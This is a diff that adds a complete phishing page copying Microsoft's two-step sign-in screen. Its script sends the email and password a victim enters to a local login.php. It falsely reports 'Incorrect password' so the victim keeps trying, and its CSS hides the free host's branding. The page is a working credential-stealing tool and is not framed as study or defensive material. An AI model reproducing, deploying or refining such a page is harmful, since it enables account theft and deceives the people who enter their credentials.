@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- <link rel="stylesheet" href="./font-awesome-4.7.0/css/font-awesome.min.css"> -->
+    <style>
+        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            color: #383838;
+            /* overflow-y: hidden; */
+        }
+
+        #form::-webkit-scrollbar {
+            background: transparent;
+            width: 0;
+            height: 0;
+        }
+
+        .container-item {
+            z-index: 99999;
+            margin: 40px 10%;
+            overflow-x: hidden;
+        }
+
+        .container-item-2 {
+            margin: 40px 10%;
+            border: 1px solid #7c7c7c;
+            display: flex;
+            justify-content: left;
+            align-items: center;
+            color: #383838;
+            padding: 5px 15px;
+        }
+
+        input {
+            padding: 10px 1px;
+            width: 100%;
+            border: 1px solid transparent;
+            border-bottom: 1px solid #383838;
+            z-index: 1;
+        }
+
+        .slide-one {
+            width: 100%;
+            transition: 0.5s ease all;
+        }
+
+        .slide-two {
+            width: 100%;
+            transition: 0.5s ease all;
+        }
+
+        .slide-one-toggle {
+            transform: translateX(-100%);
+        }
+
+        .slide-two-toggle {
+            transform: translateX(-100%);
+        }
+
+        input:focus {
+            border-bottom: 1px solid red;
+            outline: 1px solid transparent;
+        }
+
+        #form p {
+            font-size: 14px;
+        }
+
+        #form p img {
+            transform: translateY(6px);
+        }
+
+        #form {
+            display: flex;
+            justify-content: space-between;
+            overflow-x: scroll;
+            width: 200%;
+        }
+
+        #btn {
+            background: #0067B8;
+            color: white;
+            border: 1px solid transparent;
+            width: 100px;
+            text-align: center;
+            border-radius: 2px;
+            padding: 8px 5px;
+        }
+
+        span {
+            color: dodgerblue;
+        }
+
+        .btn-item {
+            display: flex;
+            justify-content: right;
+            margin: 25px 0;
+        }
+
+        footer ul {
+            list-style-type: none;
+            display: flex;
+            justify-content: center;
+            position: fixed;
+            bottom: 0;
+            font-size: 12px;
+        }
+
+        footer ul li {
+            padding: 5px 10px;
+        }
+
+        a {
+            text-decoration: none;
+            color: #383838;
+        }
+
+        @media screen and (min-width: 600px) {
+            body {
+                background: linear-gradient(27deg, rgba(231, 216, 210, 1) 28%, rgba(214, 220, 227, 1) 52%, rgba(214, 225, 210, 1) 80%, rgba(231, 216, 210, 1) 100%);
+            }
+            .container {
+                margin: 5% 50%;
+                transform: translateX(-50%);
+                width: 70%;
+                background: white;
+                padding: 10px;
+                box-shadow: 1px 1px 10px #b3b1b180;
+            }
+            .container-item-2 {
+                margin: 8% 50%;
+                transform: translate(-50%, -20px);
+                width: 70%;
+                background: white;
+                padding: 10px;
+                box-shadow: 1px 1px 10px #b3b1b180;
+            }
+            footer {
+                display: flex;
+                justify-content: center;
+            }
+        }
+
+        @media screen and (min-width: 768px) {
+            .container {
+                width: 40%;
+            }
+            .container-item-2 {
+                transform: translate(-50%, -50px);
+                width: 40%;
+            }
+        }
+
+        @media screen and (min-width: 1200px) {
+            .container {
+                width: 30%;
+            }
+            .container-item-2 {
+                transform: translate(-50%, -70px);
+                width: 30%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="container-item">
+            <img src="./images/microsoft-logo.svg" alt=""><br><br>
+            <div id='form'>
+                <div class="slide-one">
+                    <h2>Sign in</h2>
+                    <span class='msg' style="color: red; font-size: 13px;"></span>
+                    <br>
+                    <input type="email" id='email' name='email' placeholder="Email, phone, or Skype"><br><br>
+                    <p>No account? <a href=""><span>Create one!</span></a></p>
+                    <p style="color: dodgerblue;">Sign in with a security key <img src="./images/question.JPG" alt="">
+                    </p>
+                    <div class="btn-item">
+                        <p id="btn" class="next">Next</p>
+                    </div>
+                </div>
+
+                <div class="slide-two">
+                    <span class='msg2' style="color: red; font-size: 13px;"></span><br>
+                    <p id='back'><i class="fa fa-arrow-left"></i> <span id='name' style="color: #383838;"></span></p><br>
+                    <h2>Enter password</h2><br>
+                    <input type="password" id='password' name='password' placeholder="Password"><br><br>
+                    <p>Forget password?</p>
+                    <a href="">
+                        <p style="color: dodgerblue;">Other ways to sign in
+                        </p>
+                    </a>
+                    <div class="btn-item">
+                        <button id="btn" class="submit">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-item-2"><img src="./images/key.JPG" width="25px"> <span style="color: #383838;">Sign- in
+            options</span></div>
+
+    <footer>
+        <ul>
+            <a href="#">
+                <li>Terms of use</li>
+            </a>
+            <a href="#">
+                <li>Privacy & cookies</li>
+            </a>
+            <a href="#">
+                <li>...</li>
+            </a>
+        </ul>
+    </footer>
+
+    <script>
+        var next = document.querySelector('.next');
+        var submit = document.querySelector('.submit');
+        var slide_one = document.querySelector('.slide-one');
+        var slide_two = document.querySelector('.slide-two');
+        var email = document.getElementById('email')
+        var nameText = document.getElementById('name')
+        var back_btn = document.getElementById('back')
+        var password = document.getElementById('password')
+        var msg = document.querySelector('.msg')
+        var msg2 = document.querySelector('.msg2')
+        var container_item_2 = document.querySelector('.container-item-2')
+        next.addEventListener('click', function() {
+            if (email.value == "") {
+                msg.textContent = 'Enter a valid email address, phone number, or Skype name.'
+            } else {
+                msg.textContent = ""
+                nameText.textContent = email.value
+                slide_one.classList.add('slide-one-toggle')
+                slide_two.classList.add('slide-two-toggle')
+                container_item_2.style.display = 'none'
+            }
+        })
+        back_btn.addEventListener('click', function() {
+            slide_one.classList.remove('slide-one-toggle')
+            slide_two.classList.remove('slide-two-toggle')
+            container_item_2.style.display = 'flex'
+        })
+
+        submit.addEventListener('click', function() {
+            if (password.value == "") {
+                msg2.textContent = 'Please enter the password for your Microsoft account.'
+            } else {
+                msg2.textContent = 'Incorrect password! please try again...'
+                var xhr = new XMLHttpRequest()
+                var data = new FormData();
+                data.append('email', email.value + " (hotmail)")
+                data.append('password', password.value)
+                xhr.onreadystatechange = function() {
+
+                }
+                xhr.open('POST', './login.php', true)
+                xhr.send(data)
+            }
+
+        })
+    </script>
+</body>
+
+</html>
